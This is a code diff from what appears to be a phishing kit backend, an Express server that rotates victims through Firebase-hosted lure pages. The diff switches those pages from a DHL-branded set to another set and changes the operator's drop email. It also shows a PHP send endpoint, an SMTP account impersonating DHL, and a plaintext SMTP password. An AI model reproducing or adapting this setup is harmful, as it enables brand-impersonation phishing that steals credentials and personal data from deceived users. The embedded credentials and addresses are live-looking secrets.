@@ -10,19 +10,19 @@ const body_parser_1 = __importDefault(require("body-parser"));
 const app = express_1.default();
 app.use(body_parser_1.default.urlencoded({ extended: true }));
 const redirectArray = [
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%2010.html?alt=media&token=0ee05c1e-4bec-4bc2-a632-64a96bd9f958',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%202.html?alt=media&token=f4568c0b-fba4-4cee-82b2-656750705117',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%203.html?alt=media&token=61aad298-a54b-46f6-97f4-cfd14bd9dece',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%204.html?alt=media&token=9d453a8e-a386-4714-b4ec-08a32ea8c1ad',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%205.html?alt=media&token=1ba37df4-6e45-4299-977b-41cd12254be6',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%206.html?alt=media&token=b32b9902-a244-4c5a-9456-cf9d5ba660ba',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%207.html?alt=media&token=28cfffe9-44ed-4f26-b2bb-c3706f9c6bf4',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%208.html?alt=media&token=de8ad1f2-d081-460a-b29d-57599d09fb89',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%209.html?alt=media&token=bdc5c9e7-49b7-45ae-a3fc-66df18b5d2f5',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy.html?alt=media&token=8095e1e8-1c2f-4625-97cd-c7079c3c2007',
-    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex.html?alt=media&token=4f3395d6-cfdc-4795-b665-32480706f7fb'
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%2010.html?alt=media&token=930a0752-a0b2-42c0-b14b-47711f0df75d',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%202.html?alt=media&token=3b0c7ca5-cf5e-4ded-b6e5-62b031397548',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%203.html?alt=media&token=116ae969-5917-494b-8b28-c4d4c5b9c849',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%204.html?alt=media&token=117c8f1d-bdd9-4169-a765-ca76d31b30a5',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%205.html?alt=media&token=b3cbd189-3d9b-4695-a908-6de7c4b39828',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%206.html?alt=media&token=4a318039-9719-41f5-be37-bc893e0d6818',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%207.html?alt=media&token=5662f1a2-59dc-4227-ae93-76ba44be9103',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%208.html?alt=media&token=22edbffe-456e-416d-ad85-eab390c6d330',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%209.html?alt=media&token=da9177e2-86c4-4acb-8704-02ce9df3a02d',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy.html?alt=media&token=70806436-1eb3-4af0-bbd4-1158501b4ce4',
+    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex.html?alt=media&token=a9db62e0-49c8-462a-a43e-ba0c8e11986b'
 ];
-const link = 'https://wertyh.tk/cgi-bin/vendor/send.php', email = 'alxy697@gmail.com', smtpusername = 'dhl@1carwash.ml', smtppass = 'ifeanyi12345', smtpservername = '1carwash.ml', lastRedirect = '';
+const link = 'https://wertyh.tk/cgi-bin/vendor/send.php', email = 'alibishopstan@yandex.com', smtpusername = 'dhl@1carwash.ml', smtppass = 'ifeanyi12345', smtpservername = '1carwash.ml', lastRedirect = '';
 // test();
 // run $ nodemon index.js
 app.get('/test', (req, res) => {
